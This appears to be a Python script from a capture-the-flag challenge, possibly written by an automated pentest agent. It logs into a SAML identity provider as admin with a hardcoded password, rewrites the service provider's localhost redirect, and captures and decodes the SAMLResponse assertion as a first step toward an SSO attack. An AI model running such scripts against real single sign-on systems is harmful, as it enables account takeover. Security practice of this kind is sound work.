import urllib.request, urllib.parse, http.cookiejar, re, base64

IDP = "http://oj-10-30-15-1-58595.adworld.xctf.org.cn"
SP  = "http://oj-10-30-15-1-49263.adworld.xctf.org.cn"

cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
op.addheaders = [('User-Agent','Mozilla/5.0')]

def openf(u, data=None):
    try:
        r = op.open(u, data=data, timeout=25)
        return r.status, dict(r.headers), r.read().decode('utf8','replace')
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read().decode('utf8','replace')

# admin login
openf(IDP+"/login")
st,h,s = openf(IDP+"/login", urllib.parse.urlencode({"username":"admin","password":"RCTF2025"}).encode())
print("login post status", st, "portal?", "Portal" in s)

# get SAMLRequest via SP login (no follow)
st,h,s = openf(SP+"/saml/login")
loc = h.get("Location")
print("SP /saml/login ->", st, loc[:80] if loc else None)

sso = loc.replace("http://127.0.0.1:80", IDP).replace("http://127.0.0.1", IDP)
st2,h2,s2 = openf(sso)
print("SSO status", st2)
open("/home/kali/secpt/var/jobs/ab-single-1/ws/sso_out.html","w").write(s2)
m = re.search(r'name="SAMLResponse"\s+value="([^"]+)"', s2)
ma = re.search(r'action="([^"]+)"', s2)
print("SAMLResponse found:", bool(m), "action:", ma.group(1) if ma else None)
if m:
    open("/home/kali/secpt/var/jobs/ab-single-1/ws/real_resp.b64","w").write(m.group(1))
    print("---- decoded ----")
    print(base64.b64decode(m.group(1)).decode('utf8','replace'))
